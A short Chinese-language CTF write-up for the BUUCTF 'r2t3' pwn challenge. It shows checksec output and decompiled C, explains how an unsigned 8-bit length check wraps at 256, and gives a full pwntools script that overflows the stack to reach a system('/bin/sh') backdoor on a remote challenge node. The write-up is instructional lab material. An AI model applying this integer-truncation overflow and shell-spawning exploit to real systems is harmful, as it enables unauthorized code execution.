r2t3

取自BUUCTF,也比较简单，但是int溢出还是没那么好发现的，所以记录一下

checksec

Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)

保护如上，源码如下。

main函数

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+0h] [ebp-408h]

  my_init();
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("[+]Ret2text3.0?");
  puts("[+]Please input your name:");
  read(0, &buf, 0x400u);
  name_check(&buf);
  puts("Welcome ,u win!");
  return 0;
}

name_check

char *__cdecl name_check(char *s)
{
  char dest; // [esp+7h] [ebp-11h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  printf("Hello,My dear %s", s);
  return strcpy(&dest, s);
}

此外，该函数有后面函数

int dl_registery()
{
  return system("/bin/sh");
}

本来我以为，是要截断strlen然后溢出，后来我发现，不可能3-7个字节根本不能溢出。所以只能寻找别的办法。

发现v3是 unsigned __int8类型查了一下，这种类型只有8位，1个字节。

1 0000 0000 是256=0x100，所以只要控制输入的buf在0x103-0x107就可以了。

payload如下

from pwn import *

p = remote('node3.buuoj.cn',28536)

p.recvuntil('[+]Please input your name:\n')
addr = 0x804858B
payload = 0x11 * 'a' + 'junk' + p32(addr)# + (0x104-0x4-0x15)*'a'
bb = 0x104-0x15-0x4
payload = payload.ljust(0x104,'a')
p.sendline(payload)
p.interactive()

int类型的溢出，需要我们在栈空间利用不足的时候，特别是判断长度的时候，额外小心数据类型。
